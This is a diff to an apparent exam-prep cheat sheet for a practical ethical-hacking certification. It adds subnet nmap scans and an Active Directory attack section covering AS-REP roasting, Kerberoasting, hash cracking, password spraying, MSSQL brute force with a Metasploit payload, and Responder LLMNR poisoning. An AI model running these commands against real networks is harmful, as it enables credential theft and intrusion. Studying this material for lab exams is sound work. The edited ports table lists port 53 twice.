@@ -3,16 +3,30 @@
 
 ---
 
+## EXAM INFO
+- **14/20 to pass (70%)**, 6 hours + 15min break  
+- **3 subnets** to scan (IPs vary per exam, examples below)  
+- **Open book, open internet** — notes + Google allowed  
+- Parrot OS + Windows 11 provided, tools pre-installed  
+- NO phone, NO dual monitor, NO installing extra tools  
+
 ## FIRST THING: Run These Immediately
 ```
 # From Parrot (root terminal) - let these run in background
-nmap -sS -sV -O -p- -oA full_scan 10.10.1.0/24 &  
-nmap -sS -sV -O -p- -oA full_scan2 10.10.10.0/24 &  
+# SCAN ALL 3 SUBNETS - exact IPs shown at exam start
+nmap -sS -sV -O -p- -oA scan1 10.10.55.0/24 &  
+nmap -sS -sV -O -p- -oA scan2 192.168.44.0/24 &  
+nmap -sS -sV -O -p- -oA scan3 192.168.200.0/24 &  
 
-# Quick host discovery while full scan runs
-nmap -sn 10.10.1.0/24  
-nmap -sn 10.10.10.0/24  
+# Quick host discovery while full scans run
+nmap -sn 10.10.55.0/24  
+nmap -sn 192.168.44.0/24  
+nmap -sn 192.168.200.0/24  
+
+# Also run Zenmap on Windows 11 with same subnets (GUI, easy to browse results)
 ```
+> **NOTE:** Subnet IPs vary per exam. Replace with actual IPs shown in your exam.  
+> Skip .1 and .2 addresses (gateways).  
 
 ---
 
@@ -366,13 +380,92 @@ smtp-user-enum -M VRFY -U users.txt -t [ip]   # enumerate users
 
 ---
 
+## 13. ACTIVE DIRECTORY ATTACKS (NEW in v13)
+
+### Identify Domain Controller
+Port 88 (Kerberos) + Port 389 (LDAP) = **Domain Controller**  
+```
+nmap -p 88,389,445 10.10.55.0/24            # find the DC fast  
+nmap -A -sC -sV [DC-ip]                     # detailed DC scan, get domain name  
+```
+
+### AS-REP Roasting (users without pre-auth)
+```
+cd /root/impacket/examples  
+python3 GetNPUsers.py [DOMAIN]/ -no-pass -usersfile users.txt -dc-ip [DC-ip]  
+```
+- Finds users with DONT_REQ_PREAUTH set  
+- Dumps their hash → crack with john/hashcat  
+
+### Crack Kerberos Hashes
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt kerbhash.txt  
+hashcat -m 18200 kerbhash.txt rockyou.txt    # AS-REP hash (mode 18200)  
+hashcat -m 13100 kerbhash.txt rockyou.txt    # Kerberoast TGS hash (mode 13100)  
+```
+
+### Password Spraying with CrackMapExec
+```
+cme rdp [subnet]/24 -u users.txt -p "cracked_password"  
+cme smb [subnet]/24 -u users.txt -p "cracked_password"  
+cme ssh [subnet]/24 -u users.txt -p "cracked_password"  
+```
+Find which other users/machines use the same password.  
+
+### Kerberoasting (need domain user creds first)
+```
+# From compromised Windows machine:
+rubeus.exe kerberoast /outfile:hash.txt  
+
+# Or from Parrot with impacket:
+python3 GetUserSPNs.py [DOMAIN]/[user]:[password] -dc-ip [DC-ip] -outputfile hash.txt  
+```
+Then crack with `hashcat -m 13100 hash.txt rockyou.txt`  
+
+### MSSQL Attack (port 1433)
+```
+hydra -l [user] -P rockyou.txt [ip] mssql                    # brute force  
+python3 mssqlclient.py [DOMAIN]/[user]:[pass]@[ip] -port 1433  # connect  
+# In SQL shell:
+SELECT name FROM sys.databases;                                # list databases  
+# If xp_cmdshell enabled → Metasploit:
+use exploit/windows/mssql/mssql_payload  
+set RHOST [ip]  
+set USERNAME [user]  
+set PASSWORD [pass]  
+exploit  
+```
+
+### Responder (LLMNR Poisoning)
+```
+responder -I eth0 -wrf                      # capture NTLMv2 hashes on LAN  
+# Then crack with:
+hashcat -m 5600 hash.txt rockyou.txt         # NTLMv2  
+```
+
+### AD Quick Decision Tree
+```
+Port 88+389 found?  
+├── YES → it's the DC  
+│   ├── Get domain name from nmap -A scan  
+│   ├── AS-REP Roast → GetNPUsers.py → crack hash  
+│   ├── Got user creds? → Kerberoast → crack TGS hash  
+│   └── Password spray cracked passwords across subnet  
+└── Port 1433 found?  
+    ├── Hydra brute force MSSQL  
+    └── mssqlclient.py → xp_cmdshell → Metasploit  
+```
+
+---
+
 ## COMMON PORTS
 | Port | Service | Port | Service |
 |------|---------|------|---------|
-| 21 | FTP | 389 | LDAP |
-| 22 | SSH | 443 | HTTPS |
+| 21 | FTP | 88 | Kerberos (=DC) |
+| 22 | SSH | 389 | LDAP |
 | 23 | Telnet | 445 | SMB |
-| 25 | SMTP | 1433 | MSSQL |
+| 25 | SMTP | 443 | HTTPS |
+| 53 | DNS | 1433 | MSSQL |
 | 53 | DNS | 1521 | Oracle |
 | 80 | HTTP | 2049 | NFS |
 | 110 | POP3 | 3306 | MySQL |
